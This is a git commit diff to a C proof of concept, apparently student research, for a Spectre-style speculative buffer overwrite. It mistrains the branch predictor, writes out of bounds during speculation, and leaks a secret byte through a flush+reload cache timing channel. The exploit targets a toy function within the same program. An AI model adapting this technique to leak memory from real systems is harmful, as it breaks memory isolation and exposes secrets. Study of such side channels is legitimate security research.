a061e26add391ab8d569743b526dcd62826b9f35
Chris Wagenaar <c.c.j.wagenaar@student.vu.nl>
2023-05-15 22:47:56 +0200

    buffer overflow seems to work for realz now

--- buffer_overwrite/overwrite.c
+++ buffer_overwrite/overwrite.c
@@ -9,32 +9,78 @@
 #define REPETITIONS 1
 #define CACHE_HIT 100
 #define MAYBE_CACHE_HIT 175
-
+#define BUF_SIZE 16
 
 int  n_training   = 10;
 int  secret_size  = 1;
-char super_secret __attribute__ ((aligned (256))) = 97;
-
-void check_passwd(int user_idx, char user_char, char user_passwd, cp_t* arr) {
-    int  buf_size __attribute__ ((aligned (256))) = 16;
-    char user_char_copy __attribute__ ((aligned (256))) = user_char;
 
 
-    printf("uid = %4d\tuc = %c\tpwd=%c\n", user_idx, user_char_copy, user_passwd);
-    char secret = 'x';
-    char buf[buf_size];// = malloc(buf_size * sizeof(char));    //ensure buf and secret are both on stack (adjacent)
+/*
+ * Variables required in Cache
+ *  user_idx
+ *  buf
+ *  user_char_copy
+ *  user_passwd
+ *  secret
+ *  super_secret
+ *
+ * Variables requried in mem:
+ *  buf_size
+ */
 
-    printf("secret p = %p\tbuf = %p\tbuf[last] = %p\toverwr = %p\n",
-           &secret, &buf, &buf[buf_size-1], &buf[user_idx]);
+typedef struct cache_vars {
+    char user_idx;
+    char user_char;
+    char user_passwd;
+    char secret;
+    char super_secret;
+    char buf[BUF_SIZE];
+} cache_vars_t;
 
-    __sync_synchronize();
+int  buf_size __attribute__ ((aligned (256))) = BUF_SIZE;
+
+void check_passwd(int user_idx, char user_char, char user_passwd, cp_t* arr, char super_secret) {
+
+
+
+    //gooi dit maar in struct
+    cache_vars_t cache __attribute__ ((aligned (256)));
+    cache.user_idx = user_idx;
+    cache.user_char = user_char;
+    cache.user_passwd = user_passwd;
+    cache.secret = 'x';
+    cache.super_secret = super_secret;//97;
+
+    buf_size = BUF_SIZE;
+    //printf("uid = %4d\tuc = %c\tpwd=%c\n", user_idx, user_char_copy, user_passwd);
+    //printf("secret p = %p\tbuf = %p\tbuf[last] = %p\toverwr = %p\n",
+    //       &cache.secret, &cache.buf, &cache.buf[buf_size-1], &cache.buf[cache.user_idx]);
+
+    /*cache.user_idx = user_idx;
+    cache.user_char = user_char;
+    cache.user_passwd = user_passwd;
+    cache.secret = 'x';
+    cache.super_secret = 97;
+
+    buf_size = BUF_SIZE;*/
+
+    cpuid();
     flush((void*)&buf_size);
-    __sync_synchronize();
-    //volatile char user_passwd_copy   = user_passwd;
-    //volatile char secret_copy        = secret;
-    //__sync_synchronize();
+    cpuid();
 
-    if(user_char_copy=='s') {
+
+    /*if(user_char_copy=='s') {
+        printf("%p\tload buf_size\n", &buf_size);
+        printf("%p\tload user_char_copy\n", &user_char_copy);
+        printf("%p\tload user_idx\n", &user_idx);
+        printf("%p\tload buf[user_idx]\n", &buf[user_idx]);
+        printf("%p\tload user_passwd\n", &user_passwd);
+        printf("%p\tload secret\n", &secret);
+        printf("%p\tload super secret\n", &super_secret);
+        //printf("%p\tload arr\n", &arr, arr_time);
+        printf("%p\tload arr[super_s]\n", &arr[super_secret]);
+    }//*/
+    /*if(user_char_copy=='s') {
         //als ik hier flush, wordt buf_size hierna wel gwn uit memory gefetch (ipv cache)
         int buf_size_time   = time_mem_load(&buf_size);
         int user_char_time  = time_mem_load(&user_char_copy);
@@ -58,18 +104,19 @@ void check_passwd(int user_idx, char user_char, char user_passwd, cp_t* arr) {
     }//*/
 
     //bounds check should prevent overwrite. But speculatively executes
-    if (user_idx < buf_size) {
+    if (cache.user_idx < buf_size) {
         //if (user_char_copy == 's') printf("\noverwriting %p with 's'\n", &buf[user_idx]);
-        buf[user_idx] = user_char_copy;
+        cache.buf[cache.user_idx] = cache.user_char;
     }
 
     //printf("secret = %c\n", secret);
 
     //secret has been (speculatively) overwritten with user char.
-    if (user_passwd == secret) {
-        volatile cp_t cp = arr[super_secret];
+    if (cache.user_passwd == cache.secret) {
+        volatile cp_t cp = arr[cache.super_secret];
         //printf("super secret: '%c' (%d)\n", cp.id, cp.id);
     }
+
 }
 
 int* overwrite(int index) {
@@ -82,26 +129,34 @@ int* overwrite(int index) {
     int user_ids[n_accesses];
     char user_chars[n_accesses];
     char user_pwds[n_accesses];
+        char user_s_secret[n_accesses];
 
     for(int i = 0; i < n_accesses; i++) {
         user_ids[i] = i % 16;//buf_size;
         user_chars[i] = 'a' + (i%26);
         user_pwds[i] = 'x';
+            user_s_secret[i] = 'b';
     }
-    user_ids[n_training] = 4094 - 256 + 16;
+    user_ids[n_training] = 4094 - 512;// + 10000;
     user_chars[n_training] = 's';
     user_pwds[n_training] = 's';
+        user_s_secret[n_training] = 'c';
+    cpuid();
 
     //Misstrain branch predictor, access out of bounds on last call
     for(int i = 0; i < n_accesses; i++) {
-        check_passwd(user_ids[i], user_chars[i], user_pwds[i], arr);
+        check_passwd(user_ids[i], user_chars[i], user_pwds[i], arr, user_s_secret[i]);
         //ensures completion before flushing. bar prevents speculative access from being flushed
-        __sync_synchronize();
-        if(user_chars[i] != 's') flush((void*)&arr[super_secret]);
+        cpuid();
+        if(user_pwds[i] != 's') {
+            asm volatile ("cpuid\n":::);
+            flush((void*)&arr[user_s_secret[i]]);
+        }
+        cpuid();
     }
 
     //make sure previous loop finishes execution
-    __sync_synchronize();
+    cpuid();
 
     //time loading duration per array index
     int* results = reload(arr, N_PAGES, CACHE_HIT, MAYBE_CACHE_HIT);
